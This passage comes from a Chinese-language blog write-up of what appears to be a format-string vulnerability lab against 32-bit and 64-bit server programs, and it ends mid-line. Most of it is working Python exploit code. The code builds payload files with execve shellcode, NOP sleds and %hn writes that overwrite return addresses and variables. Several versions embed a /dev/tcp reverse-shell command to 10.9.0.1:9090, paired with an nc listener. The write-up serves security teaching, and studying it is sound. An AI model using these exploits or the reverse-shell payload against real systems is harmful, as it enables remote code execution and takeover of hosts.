class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_32<br><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">1500</span>-<span class="hljs-built_in">len</span>(shellcode)              <span class="hljs-comment"># Change this number</span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><span class="hljs-built_in">print</span>(start)<br><span class="hljs-comment">############################################################</span><br><span class="hljs-comment"># This line shows how to store a 4-byte integer at offset 0</span><br>number  = <span class="hljs-number">0xffffd39c</span> <span class="hljs-comment"># myprintf返回地址后两个字节地址,根据实际情况修改（小端法，读两个字节就是0x5068）</span><br>number2 = number+<span class="hljs-number">2</span>   <span class="hljs-comment"># target前2个字节地址</span><br>bufstart=<span class="hljs-number">0xFFFFD470</span>    <span class="hljs-comment">#buf起始地址，根据实际情况修改</span><br>shellstart=bufstart+start <br><br>high=shellstart&gt;&gt;<span class="hljs-number">16</span>;<br>low=shellstart&amp;<span class="hljs-number">0x0000FFFF</span><br><br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number2).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># This line shows how to store a 4-byte string at offset 4</span><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]  =  (<span class="hljs-string">&quot;abcd&quot;</span>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># This line shows how to construct a string s with</span><br><span class="hljs-comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span><br>s = <span class="hljs-string">&quot;.%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.&quot;</span>+ <span class="hljs-built_in">str</span>(high-<span class="hljs-number">0x243</span>+<span class="hljs-number">0x9</span>) +<span class="hljs-string">&quot;x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span> +<span class="hljs-string">&quot;%.&quot;</span>+ <span class="hljs-built_in">str</span>(low+<span class="hljs-number">0x10000</span>-high) +<span class="hljs-string">&quot;x&quot;</span>  +<span class="hljs-string">&quot;%hn&quot;</span>+<span class="hljs-string">&quot;\n&quot;</span><br><br><span class="hljs-comment"># The line shows how to store the string s at offset 8</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><br><span class="hljs-comment"># Write the content to badfile</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p>成功返回success</p><p><img src="/posts/35f73974/image-20211204170518369.png" alt="image-20211204170518369"></p><h3 id="创建反向shell"><a class="markdownIt-Anchor" href="#创建反向shell"></a> 创建反向shell</h3><p>我们对运行一些预先确定的命令不感兴趣。我们希望在目标服务器上获得一个root权限的shell，这样我们就可以输入任何我们想要的命令。由于我们是在一台远程机器上，如果我们只是让服务器运行/bin/bash，我们将无法控制shell程序。反向shell是解决这个问题的一种典型技术。第9节提供了如何运行反向shell的详细说明。我们要修改修改自己的shell代码中的命令字符串，使得我们可以在目标服务器上获得一个反向shell。</p><p>这需要修改shellcode部分</p><p>然后在另一个终端运行nc -lvn 9090命令</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br>   <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p><img src="/posts/35f73974/image-20211204172909598.png" alt="image-20211204172909598"></p><p><img src="/posts/35f73974/image-20211204172808461.png" alt="image-20211204172808461"></p><h1 id="task-5-attacking-the-64-bit-server-program"><a class="markdownIt-Anchor" href="#task-5-attacking-the-64-bit-server-program"></a> Task 5: Attacking the 64-bit Server Program</h1><p>先发送一个hello验证一下</p><p><img src="/posts/35f73974/image-20211204173622363.png" alt="image-20211204173622363"></p><h3 id="由64位地址引起的挑战"><a class="markdownIt-Anchor" href="#由64位地址引起的挑战"></a> 由64位地址引起的挑战</h3><p><code>x64</code>架构引起的一个挑战是地址中的零。虽然<code>x64</code>架构支持64位地址空间，但只允许从0x00到0x00007fffffffff的地址。</p><p>这意味着对于每个地址(8字节)，最高的两个字节总是零。这就产生了一个问题</p><p>在这种攻击中，我们需要将地址放在格式字符串中。对于32位程序，我们可以把地址放在任何地方，因为地址里面没有零。我们不能再为64位程序这样做了。</p><p>如果在格式字符串中间放置一个地址，当<code>printf()</code>解析格式字符串时，当它看到一个零时，它将停止解析。格式字符串中第一个零之后的任何内容都不会被认为是格式字符串的一部分。</p><p>与缓冲区溢出攻击不同，在缓冲区溢出攻击中，如果使用strpcy()， 0将终止内存复制。</p><p>这里，程序中没有内存复制，所以我们可以在输入中有0，但将它们放在哪里是关键。</p><h3 id="自由移动va_list的技术"><a class="markdownIt-Anchor" href="#自由移动va_list的技术"></a> 自由移动va_list的技术</h3><p>在格式字符串中，我们可以使用<code>%x</code>将参数指针<code>va_list</code>移动到下一个可选参数。我们也可以直接将指针移动到第k个可选参数。</p><p>这是使用格式字符串的参数字段(以<code>k$</code>的形式)完成的。</p><p>下面的代码示例使用<code>%3$.20x</code>打印第三个可选参数的值3（前面填19个0），然后使用<code>%6$n</code>将一个值写入第6个可选参数（变量var，其值将变为20）。最后，使用<code>%2$.10x</code>时，它将指针移回第二个可选参数，并将其打印出来（2，前面填9个0）。</p><h3 id="修改secret-message"><a class="markdownIt-Anchor" href="#修改secret-message"></a> 修改secret message</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Initialize the content array</span><br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br>s = <span class="hljs-string">&quot;%38$.16lx\n&quot;</span> + <span class="hljs-string">&quot;%38$s.\n&quot;</span> <span class="hljs-comment"># &quot;%6$#.8x&quot; + &quot;%s&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>offset=<span class="hljs-number">32</span>-<span class="hljs-built_in">len</span>(fmt)<br>content[offset:offset+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><br>number  = <span class="hljs-number">0x0000555555556008</span><br>content[offset+<span class="hljs-built_in">len</span>(fmt):offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">8</span>]  =  (number).to_bytes(<span class="hljs-number">8</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># Write the content to badfile</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/posts/35f73974/image-20211204174802673.png" alt="image-20211204174802673"></p><h3 id="修改target"><a class="markdownIt-Anchor" href="#修改target"></a> 修改target</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Initialize the content array</span><br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br>s = <span class="hljs-string">&quot;%38$.16lx\n&quot;</span> + <span class="hljs-string">&quot;%38$ln\n&quot;</span> <span class="hljs-comment"># &quot;%6$#.8x&quot; + &quot;%s&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>offset=<span class="hljs-number">32</span>-<span class="hljs-built_in">len</span>(fmt)<br>content[offset:offset+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><br>number  = <span class="hljs-number">0x0000555555558010</span><br>content[offset+<span class="hljs-built_in">len</span>(fmt):offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">8</span>]  =  (number).to_bytes(<span class="hljs-number">8</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># Write the content to badfile</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/posts/35f73974/image-20211204180423706-16386122915901.png" alt="image-20211204180423706"></p><h3 id="修改返回地址执行shellcode"><a class="markdownIt-Anchor" href="#修改返回地址执行shellcode"></a> 修改返回地址执行shellcode</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>    <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>    <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_64<br><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">8</span>              <span class="hljs-comment"># Change this number</span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br><span class="hljs-comment">############################################################</span><br>buffer = <span class="hljs-number">0x00007fffffffe3a0</span> <span class="hljs-comment"># buffer地址</span><br>ebp = <span class="hljs-number">0x00007fffffffe2e0</span>    <span class="hljs-comment"># myprintf的ebp值</span><br>num1 = buffer &amp; (<span class="hljs-number">0x000000000000ffff</span>)<br>num2 = <span class="hljs-number">0xffff</span><br>num3 = <span class="hljs-number">0x7fff</span><br>num4 = <span class="hljs-number">0x0000</span><br><span class="hljs-comment"># 可以直接修改buffer和ebp之后攻击，243是offset +1，后面 -2是因为前面有两个&#x27;\n&#x27;字符</span><br>s = <span class="hljs-string">&quot;%74$.&quot;</span>+ <span class="hljs-built_in">str</span>(num1-<span class="hljs-number">243</span>)+<span class="hljs-string">&quot;lx\n&quot;</span> + <span class="hljs-string">&quot;%74$hn\n&quot;</span> + <span class="hljs-string">&quot;%75$.&quot;</span>+ <span class="hljs-built_in">str</span>(num2-num1-<span class="hljs-number">2</span>)+ <span class="hljs-string">&quot;x\n&quot;</span> + <span class="hljs-string">&quot;%75$hn\n&quot;</span> +<span class="hljs-string">&quot;%76$.32766lx\n&quot;</span> + <span class="hljs-string">&quot;%76$hn\n&quot;</span> +<span class="hljs-string">&quot;%77$.32767lx\n&quot;</span> + <span class="hljs-string">&quot;%77$hn\n&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>offset=<span class="hljs-number">320</span>-<span class="hljs-built_in">len</span>(fmt)<br><span class="hljs-built_in">print</span>(offset+<span class="hljs-number">1</span>) <span class="hljs-comment"># num1 - offset +1</span><br>content[offset:offset+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><span class="hljs-comment"># target地址0x0000555555558010，代替number查看修改的值，用来调试</span><br>number  =  ebp + <span class="hljs-number">0x8</span><br>content[offset+<span class="hljs-built_in">len</span>(fmt):offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">8</span>]  =  (number).to_bytes(<span class="hljs-number">8</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>number2 = number + <span class="hljs-number">2</span><br>content[offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">8</span>:offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">16</span>]  =  (number2).to_bytes(<span class="hljs-number">8</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>number3 = number2 + <span class="hljs-number">2</span><br>content[offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">16</span>:offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">24</span>]  =  (number3).to_bytes(<span class="hljs-number">8</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>number4 = number3 + <span class="hljs-number">2</span><br>content[offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">24</span>:offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">32</span>]  =  (number4).to_bytes(<span class="hljs-number">8</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment">############################################################</span><br><br><span class="hljs-comment"># Save the format string to file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/posts/35f73974/image-20211204180926178.png" alt="image-20211204180926178"></p><h3 id="创建反向shell-2"><a class="markdownIt-Anchor" href="#创建反向shell-2"></a> 创建反向shell</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br>   <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_64<br><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">8</span>              <span class="hljs-comment"># Change this number</span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br><span class="hljs-comment">############################################################</span><br>buffer = <span class="hljs-number">0x00007fffffffe3a0</span> <span class="hljs-comment"># buffer地址</span><br>ebp = <span class="hljs-number">0x00007fffffffe2e0</span>    <span class="hljs-comment"># myprintf的ebp值</span><br>num1 = buffer &amp; (<span class="hljs-number">0x000000000000ffff</span>)<br>num2 = <span class="hljs-number">0xffff</span><br>num3 = <span class="hljs-number">0x7fff</span><br>num4 = <span class="hljs-number">0x0000</span><br><span class="hljs-comment"># 可以直接修改buffer和ebp之后攻击，243是offset +1，后面 -2是因为前面有两个&#x27;\n&#x27;字符</span><br>s = <span class="hljs-string">&quot;%74$.&quot;</span>+ <span class="hljs-built_in">str</span>(num1-<span class="hljs-number">243</span>)+<span class="hljs-string">&quot;lx\n&quot;</span> + <span class="hljs-string">&quot;%74$hn\n&quot;</span> + <span class="hljs-string">&quot;%75$.&quot;</span>+ <span class="hljs-built_in">str</span>(num2-num1-<span class="hljs-number">2</span>)+ <span 